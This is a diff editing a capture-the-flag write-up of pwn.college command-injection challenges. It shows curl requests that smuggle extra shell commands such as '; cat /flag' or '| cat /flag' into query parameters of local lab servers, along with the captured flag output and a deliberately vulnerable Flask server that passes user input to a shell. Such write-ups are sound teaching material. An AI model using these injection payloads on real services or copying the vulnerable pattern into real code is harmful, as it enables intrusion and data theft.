@@ -181,25 +181,29 @@ curl "challenge.localhost:80/mission?target=/"
 ls -l /
 ```
 
-We can terminate the `ls` command and run any command that we want.
+### Command injection
+
+#### Semicolon `;`
+
+If we use the semicolon `;` character, it ends the current shell statement and begins a new shell statement.
 
 ```
 ## Request:
-curl "challenge.localhost:80/mission?target=/;%20cat%20/flag%20#"  ==>  curl "challenge.localhost:80/mission?target=/; cat /flag #"
+curl "challenge.localhost:80/mission?target=/;%20cat%20/flag%"  ==>  curl "challenge.localhost:80/mission?target=/; cat /flag"
 
 ## Resultant command:
 ls -l /;
-cat /flag #
+cat /flag
 ```
 
 ```
-hacker@web-security~cmdi-1:/$ curl "challenge.localhost:80/mission?target=/;%20cat%20/flag%20#"
+hacker@web-security~cmdi-1:/$ curl "challenge.localhost:80/mission?target=/;%20cat%20/flag"
 
         <html><body>
         Welcome to the dirlister service! Please choose a directory to list the files of:
         <form action="/mission"><input type=text name=target><input type=submit value=Submit></form>
         <hr>
-        <b>Output of ls -l /; cat /flag :</b><br>
+        <b>Output of ls -l /; cat /flag:</b><br>
         <pre>total 64
 lrwxrwxrwx    1 root root    7 Apr  4 02:03 bin -> usr/bin
 drwxr-xr-x    2 root root 4096 Apr 15  2020 boot
@@ -279,24 +283,26 @@ app.run("challenge.localhost", 80)
 
 This challenge replaces our semi-colon `";"` with blank space `""`.
 
-In order to get around this we can use a PIPE (`|`) operator.
+### Command injection
+
+In order to get around this we can use a PIPE (`|`) operator. It causes the output of the first command to be sent to the second as input.
 
 ```
 ## Request:
-curl "challenge.localhost:80/event?destination=/%20|%20cat%20/flag%20#"  ==>  curl "challenge.localhost:80/event?destination=/ | cat /flag #"
+curl "challenge.localhost:80/event?destination=/%20|%20cat%20/flag"  ==>  curl "challenge.localhost:80/event?destination=/ | cat /flag"
 
 ## Resultant command:
-ls -l / | cat /flag #
+ls -l / | cat /flag
 ```
 
 ```
-hacker@web-security~cmdi-2:/$ curl "challenge.localhost:80/event?destination=/%20|%20cat%20/flag%20#"
+hacker@web-security~cmdi-2:/$ curl "challenge.localhost:80/event?destination=/%20|%20cat%20/flag"
 
         <html><body>
         Welcome to the dirlister service! Please choose a directory to list the files of:
         <form action="/event"><input type=text name=destination><input type=submit value=Submit></form>
         <hr>
-        <b>Output of ls -l / | cat /flag :</b><br>
+        <b>Output of ls -l / | cat /flag:</b><br>
         <pre>pwn.college{obrVvG7pT1vGdbdi4WO7kgKhwY2.dRjN1YDL4ITM0EzW}
 </pre>
         </body></html>
@@ -352,11 +358,13 @@ app.run("challenge.localhost", 80)
 This time, the user input is inserted between single quotes.
 This causes special characters like `;` to be treated like normal strings.
 
+### Command injection
+
 We have to escape the quotes while being careful that we balance out the quotes.
 
 ```
 ## Request:
-curl "challenge.localhost:80/quest?path=/';%20cat%20/flag'#"  ==>  curl "challenge.localhost:80/quest?path=/'; cat /flag'#"
+curl "challenge.localhost:80/quest?path=/';%20cat%20/flag'"  ==>  curl "challenge.localhost:80/quest?path=/'; cat /flag'"
 
 ## Resultant commands:
 ls -l '/';
@@ -449,7 +457,6 @@ app.run("challenge.localhost", 80)
 ```
 
 As we can see, the server takes the value given to the `zone` parameter.
-
 It then inserts the argument in the shell command to retrieve the date.
 
 ```
@@ -496,7 +503,7 @@ hacker@web-security~cmdi-4:/$ curl "http://challenge.localhost:80/exercise?zone=
 
 ```
 ## Request:
-curl 'http://challenge.localhost:80/exercise?zone=;%20cat%20%2Fflag;#'  ==>  curl 'http://challenge.localhost:80/exercise?zone=; cat /flag;#'
+curl 'http://challenge.localhost:80/exercise?zone=;%20cat%20%2Fflag;%23'  ==>  curl 'http://challenge.localhost:80/exercise?zone=; cat /flag;#'
 
 ## Resultant commands:
 TZ=;
@@ -513,7 +520,55 @@ hacker@web-security~cmdi-4:/$ curl 'http://challenge.localhost:80/exercise?zone=
         <hr>
         <b>Output of TZ=; cat /flag; date:</b><br>
         <pre>pwn.college{Ysq82cpYvUuY5etm1UCOIotGS6b.dhDOzMDL4ITM0EzW}
-Tue Jun 10 16:44:17 UTC 2025
 </pre>
         </body></html>
+```
+
+Even if we don't comment out `date`, it should be okay because it runs with `TZ=MST` by default.
+
+&nbsp;
+
+## CMDi 4
+
+### Source code
+```py title="/challenge/server" showLineNumbers
+#!/opt/pwn.college/python
+
+import subprocess
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+@app.route("/exercise", methods=["GET"])
+def challenge():
+    arg = flask.request.args.get("zone", "MST")
+    command = f"TZ={arg} date"
+
+    print(f"DEBUG: {command=}")
+    result = subprocess.run(
+        command,  # the command to run
+        shell=True,  # use the shell to run this command
+        stdout=subprocess.PIPE,  # capture the standard output
+        stderr=subprocess.STDOUT,  # 2>&1
+        encoding="latin",  # capture the resulting output as text
+    ).stdout
+
+    return f"""
+        <html><body>
+        Welcome to the timezone service! Please choose a timezone to get the time there.
+        <form action="/exercise"><input type=text name=zone><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of {command}:</b><br>
+        <pre>{result}</pre>
+        </body></html>
+        """
+
+
+os.setuid(os.geteuid())
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = "challenge.localhost:80"
+app.run("challenge.localhost", 80)
 ```
